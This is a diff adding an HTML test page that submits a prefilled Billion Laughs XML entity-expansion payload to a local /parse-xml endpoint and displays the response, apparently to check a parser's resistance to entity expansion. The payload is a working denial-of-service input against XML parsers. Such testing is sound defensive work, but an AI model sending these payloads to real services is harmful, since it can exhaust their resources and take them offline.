@@ -1,0 +1,63 @@
+<!doctype html>
+<html>
+<head>
+  <meta charset="utf-8" />
+  <title>XXE Entity Expansion Test (Billion Laughs)</title>
+  <style>
+    body { font-family: Arial, sans-serif; max-width: 900px; margin: 0 auto; padding: 20px; }
+    textarea { width: 100%; height: 260px; font-family: monospace; }
+    pre { background: #fff; padding: 10px; border: 1px solid #ddd; overflow: auto; white-space: pre-wrap; }
+    button { padding: 10px 16px; cursor: pointer; }
+    .row { margin-top: 12px; }
+  </style>
+</head>
+<body>
+  <h1>XXE Entity Expansion Test (Billion Laughs)</h1>
+  <p>This submits raw XML to <code>/parse-xml</code> with <code>Content-Type: application/xml</code>.</p>
+
+  <form id="f">
+    <label for="xml"><b>XML Input</b></label>
+    <textarea id="xml" name="xml"><?xml version="1.0"?>
+<!DOCTYPE lolz [
+ <!ENTITY lol "lol">
+ <!ENTITY lol1 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
+ <!ENTITY lol2 "&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;">
+ <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
+ <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
+ <!ENTITY lol5 "&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;">
+]>
+<lolz>&lol5;</lolz></textarea>
+
+    <div class="row">
+      <button type="submit">Parse XML</button>
+    </div>
+  </form>
+
+  <div class="row">
+    <b>Response:</b>
+    <pre id="out">(none)</pre>
+  </div>
+
+  <script>
+    const form = document.getElementById("f");
+    const xmlEl = document.getElementById("xml");
+    const out = document.getElementById("out");
+
+    form.addEventListener("submit", async (e) => {
+      e.preventDefault();
+      out.textContent = "Sending...";
+
+      const xml = xmlEl.value;
+
+      const res = await fetch("/parse-xml", {
+        method: "POST",
+        headers: { "Content-Type": "application/xml" },
+        body: xml
+      });
+
+      const text = await res.text();
+      out.textContent = `HTTP ${res.status}\n\n` + text;
+    });
+  </script>
+</body>
+</html>
